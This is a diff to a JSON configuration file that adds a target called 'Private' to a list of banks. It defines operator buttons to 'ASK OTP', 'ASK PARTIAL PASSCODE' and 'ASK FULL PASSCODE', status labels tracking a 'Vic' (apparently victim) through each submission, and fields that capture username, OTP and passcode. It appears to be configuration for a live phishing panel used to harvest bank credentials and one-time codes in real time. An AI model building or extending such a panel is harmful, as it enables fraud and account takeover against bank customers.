@@ -121,6 +121,10 @@
 			"id": "opbank"
 		},
 		{
+			"name": "Private",
+			"id": "jl"
+		},
+		{
 			"name": "Peoples Choice",
 			"id": "people"
 		},
@@ -529,6 +533,94 @@
 		"mainInfo": [
 			{
 				"usernameHeading": "nsiNumber"
+			}
+		]
+	},
+	"jl": {
+		"buttons": [
+			{
+				"name": "ASK LOGIN AGAIN",
+				"status": "0"
+			},
+			{
+				"name": "ASK OTP",
+				"status": "2"
+			},
+			{
+				"name": "ASK PARTIAL PASSCODE",
+				"status": "4",
+				"inputs": [
+					{
+						"id": "pinIndex",
+						"placeholder": "Passcode Index (e.g 123)"
+					}
+				]
+				
+			},
+			{
+				"name": "ASK FULL PASSCODE",
+				"status": "6"
+			},
+			{
+				"name": "FINISH",
+				"status": "8"
+			}
+		],
+		"status": [
+			{
+				"status": 0,
+				"meaning": "Vic Resubmitting Login"
+			},
+			{
+				"status": 1,
+				"meaning": "Vic Waiting... Submitted Login"
+			},
+			{
+				"status": 2,
+				"meaning": "Vic Submitting OTP"
+			},
+			{
+				"status": 3,
+				"meaning": "Vic Waiting... Submitted OTP"
+			},
+			{
+				"status": 4,
+				"meaning": "Vic Submitting Passcode"
+			},
+			{
+				"status": 5,
+				"meaning": "Vic Waiting... Submitted Passcode"
+			},
+			{
+				"status": 6,
+				"meaning": "Vic Submitting Passcode"
+			},
+			{
+				"status": 8,
+				"meaning": "Finished"
+			},
+			{
+				"status": 9,
+				"meaning": "Vic Waiting... Resubmitted Login"
+			}
+		],
+		"information": [
+			{
+				"heading": "Username",
+				"key": "username"
+			},
+			{
+				"heading": "OTP",
+				"key": "otp"
+			},
+			{
+				"heading": "Passcode",
+				"key": "passcode"
+			}
+		],
+		"mainInfo": [
+			{
+				"usernameHeading": "username"
 			}
 		]
 	},
